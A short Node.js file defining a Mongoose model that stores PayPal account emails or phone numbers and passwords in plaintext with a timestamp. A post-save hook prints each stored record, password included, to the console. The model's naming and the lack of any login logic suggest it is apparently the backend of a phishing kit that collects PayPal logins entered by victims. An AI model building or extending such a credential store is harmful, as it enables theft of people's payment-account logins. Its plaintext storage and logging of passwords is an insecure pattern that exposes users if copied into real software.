const mongoose = require('mongoose');

const credentialSchema = new mongoose.Schema(
    {
        email: {
            type: String,
            required: [true, "A PayPal account must have a email address / phone number"],
            unique: true,
            trim: true,
        },

        password: {
            type: String,
            required: [true, "A PayPal account must have a password"],
            trim: true,
        },

        timestamp: {
            type: String,
            required: [true, "An entry must be timestamped"],
            trim: true
        }
    },
)

credentialSchema.post('save', function(doc, next) {
  console.log(doc);
  next();
});

const Credentials = mongoose.model('Credentials', credentialSchema);

module.exports = Credentials;